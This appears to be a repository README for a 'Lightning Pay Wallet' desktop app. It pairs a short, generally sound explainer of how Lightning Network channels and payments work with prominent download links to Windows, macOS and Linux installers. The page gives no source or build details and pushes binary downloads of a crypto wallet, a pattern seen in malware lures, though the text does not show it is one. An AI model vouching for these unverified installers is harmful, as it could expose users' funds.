<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# What the Lightning Network is and how a payment moves
A layer above bitcoin that settles payments off-chain and proves them on-chain.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

The Lightning Network is a payment layer built on top of bitcoin. It moves value without writing every
payment to the blockchain, and it can still prove that a payment happened when it settles.

## The problem it solves

Bitcoin's base layer is deliberately slow and expensive per transaction: blocks arrive roughly every
ten minutes, and block space is scarce. Buying coffee is not what that design is for. Lightning takes
small, frequent payments off the base layer and only touches the chain when a channel opens or closes.

## Channels, in one paragraph

Two parties fund a shared account on-chain: a channel. Inside it they can exchange signed updates
instantly, each one reassigning how much of the channel belongs to whom. Neither party needs the other's
permission to spend their own share, and either can close the channel to settle the final balances
on-chain. A payment between two people who do not share a channel is routed through others who do.

## How a payment travels

The payer's wallet finds a route across channels, encrypts the payment so intermediate nodes cannot see
the destination, and passes it along. Each hop takes a small fee. If the route fails partway, the
payment fails and nothing moves; if it completes, every hop is settled.

That is why a Lightning payment is either instant or failed, and why "pending" is usually an interface
problem rather than a network state.

## What it changes for a user

Payments settle in seconds and cost a fraction of a satoshi. The trade is capacity: channels need
liquidity on the right side, a brand-new wallet has none, and the first receive can involve an on-chain
transaction to create it.

## What it does not change

The bitcoin is the same bitcoin. A Lightning balance is not a token or an IOU; it is a claim on a
channel that is enforceable on-chain. Security still rests on the base layer.

## Questions people ask

### Is Lightning a separate coin?

No. It moves bitcoin. Nothing new is minted.

### Does every payment go on the blockchain?

No, only the channel open and close do. Payments inside a channel stay off-chain.

### Can Lightning payments be reversed?

No. A completed payment is final.
